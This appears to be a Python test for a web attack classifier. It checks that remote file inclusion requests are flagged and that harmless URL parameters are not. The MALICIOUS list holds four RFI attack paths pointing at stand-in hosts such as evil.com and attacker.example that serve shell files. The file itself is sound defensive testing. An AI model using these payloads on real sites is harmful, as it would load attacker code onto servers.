import os
import sys

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

from core.datatypes import EventCategory
from core.injection_signatures import classify_request

MALICIOUS = [
    ("classic RFI, .txt shell", "/index.php?page=http://evil.com/shell.txt"),
    ("classic RFI, .php shell", "/include.php?file=https://attacker.example/malicious.php"),
    ("RFI, .phtml payload", "/x.php?inc=http://evil.tld/shell.phtml"),
    ("RFI, ftp scheme", "/load.php?src=ftp://attacker.example/payload.php"),
]

BENIGN = [
    ("redirect_uri without file extension", "/?redirect_uri=https://myapp.com/callback"),
    ("avatar image URL param", "/?avatar=https://cdn.example.com/user/photo.jpg&size=large"),
    ("plain search query", "/search?q=how+to+use+bash+scripting"),
    ("no external URL at all", "/?page=about"),
]


def main() -> None:
    for label, path in MALICIOUS:
        r = classify_request("GET", path)
        assert r.top_category == EventCategory.WEB_ATTACK_LFI, (
            f"{label} ({path}): must classify as WEB_ATTACK_LFI (RFI reuses the LFI category, same "
            f"convention as XInclude reusing WEB_ATTACK_XXE), got {r.top_category}"
        )
        assert "rfi_remote_url_param" in r.rules, f"{label} ({path}): expected rfi_remote_url_param rule, got {r.rules}"
    print(f"Scenario 1 ({len(MALICIOUS)} classic RFI payloads -- remote URL assigned to a param, ending in a script-shaped extension -- all classified WEB_ATTACK_LFI) PASSED")

    for label, path in BENIGN:
        r = classify_request("GET", path)
        assert "rfi_remote_url_param" not in r.rules, (
            f"{label} ({path}): a benign external-URL param without a script-shaped extension must "
            f"never trigger the RFI rule, got rules={r.rules}"
        )
    print(f"Scenario 2 ({len(BENIGN)} benign external-URL-bearing requests -- image/no-extension/callback params -- never trigger rfi_remote_url_param) PASSED")

    print("\nALL RFI DETECTION TESTS PASSED")


main()
